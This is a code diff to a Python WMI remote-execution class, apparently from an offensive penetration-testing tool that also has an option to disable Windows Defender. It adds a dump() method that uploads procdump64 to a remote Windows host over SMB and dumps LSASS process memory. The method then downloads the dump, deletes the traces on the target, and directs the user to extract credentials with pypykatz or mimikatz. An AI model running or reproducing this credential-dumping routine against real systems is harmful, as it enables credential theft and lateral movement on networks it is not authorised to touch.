@@ -45,7 +45,7 @@ DUMMY_SHARE     = 'TMP'
 CODEC = sys.stdout.encoding
 
 class WMIEXEC:
-    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, killDefender=False):
+    def __init__(self, target, share_name, username, password, domain, smbconnection, hashes=None, share=None, killDefender=False, logger=None):
         self.__target = target
         self.__username = username
         self.__password = password
@@ -63,6 +63,8 @@ class WMIEXEC:
         self.__doKerberos = False
         self.__retOutput = True
         self.__killDefender = killDefender
+        self.__remoteshell = None
+        self.logger = logger
 
         #This checks to see if we didn't provide the LM Hash
         if hashes is not None:
@@ -244,6 +246,31 @@ class WMIEXEC:
         self.__win32Process.Create(command, self.__pwd, None)
         print('            [!] Sleeping to allow defender process to finish shutting down[!] ')
         time.sleep(8)
+
+
+    def dump(self):
+        self.__remoteshell = RemoteShell(self.__share, self.__win32Process, self.__smbconnection)
+
+        self.logger.announce('Uploading procdump64')
+
+        self.__remoteshell.do_put(str(cfg.PROC_PATH)) # default path is /.cmx/procdump64.exe
+        time.sleep(1)
+
+        self.logger.announce('Sleeping to allow procdump to finish')
+        self.__remoteshell.onecmd('procdump64.exe -ma -accepteula lsass safe.dmp')
+        time.sleep(8)
+        
+        self.logger.announce('Downloading test.dmp to current directory')
+        self.__remoteshell.do_get('safe.dmp')
+
+        self.logger.success('Finished, now cleaning up on target')
+        self.__remoteshell.onecmd('del procdump64.exe')
+        self.__remoteshell.onecmd('del safe.dmp')
+        self.__remoteshell.do_exit('')
+
+        self.logger.highlight('Credentials can now be extracted using pypykatz or running mimikatz locally')
+        self.logger.highlight('i.e.    pypykatz lsa minidump safe.dmp')
+        self.logger.highlight('Check current directory for the dmp file')
 
 
 ###################################################################################################
